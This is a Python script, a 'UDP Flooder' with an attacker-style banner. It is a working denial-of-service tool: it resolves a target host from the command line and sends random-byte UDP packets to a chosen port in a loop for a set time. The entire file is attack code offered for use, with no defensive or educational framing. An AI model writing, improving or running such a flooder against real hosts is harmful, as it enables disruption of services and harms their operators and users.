import socket
import random
import time
import argparse

RESET = '\033[0m'
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'

def create_udp_packet(size):
    return random._urandom(size)

def flood(target_ip, target_port, packet_size, flood_duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = create_udp_packet(packet_size)
    start_time = time.time()
    end_time = start_time + flood_duration
    packet_count = 0

    print(f"{BLUE}Starting flood attack on {target_ip}:{target_port} with {packet_size}-byte packets for {flood_duration} seconds...{RESET}")

    while time.time() < end_time:
        sock.sendto(packet, (target_ip, target_port))
        packet_count += 1

    sock.close()
    print(f"{GREEN}Flood completed.{RESET}")
    print(f"{YELLOW}Total packets sent: {packet_count}{RESET}")

if __name__ == "__main__":
    print(f"{RED}        +-+-+-+ +-+-+-+-+-+{RESET}")
    print(f"{RED}        |U|D|P| |F|l|o|o|d|{RESET}")
    print(f"{RED}        +-+-+-+ +-+-+-+-+-+{RESET}")
    print(f"{GREEN}==================================={RESET}")
    print(f"{YELLOW}         UDP Flooder Script{RESET}")
    print(f"{RED}       Made by Sheikh Nightshader{RESET}")
    print(f"{GREEN}==================================={RESET}")

    parser = argparse.ArgumentParser()
    parser.add_argument('url', type=str)
    parser.add_argument('port', type=int)
    parser.add_argument('packet_size', type=int)
    parser.add_argument('duration', type=int)

    args = parser.parse_args()

    target_ip = socket.gethostbyname(args.url)
    target_port = args.port
    packet_size = args.packet_size
    flood_duration = args.duration

    flood(target_ip, target_port, packet_size, flood_duration)
